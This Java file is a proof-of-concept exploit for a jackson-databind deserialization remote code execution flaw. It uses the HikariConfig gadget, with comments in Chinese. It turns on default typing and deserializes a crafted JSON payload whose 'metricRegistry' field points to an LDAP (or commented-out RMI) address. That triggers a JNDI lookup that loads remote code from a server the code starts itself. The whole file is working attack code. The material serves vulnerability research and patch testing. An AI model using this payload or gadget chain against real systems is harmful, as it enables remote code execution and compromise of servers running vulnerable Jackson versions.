package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 * jackson-databind <= 2.7.9.6、<= 2.8.11.4、<= 2.9.9.3 RCE，需要开启DefaultType
 *
 * <dependency>
 *       <groupId>com.zaxxer</groupId>
 *       <artifactId>HikariCP</artifactId>
 * </dependency>
 *
 * @author threedr3am
 */
public class HikariConfigPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

//    mapper.readValue("[\"com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"rmi://localhost:43657/Calc\"}]", Object.class);
    mapper.readValue("[\"com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"ldap://localhost:43658/Calc\"}]", Object.class);
  }
}
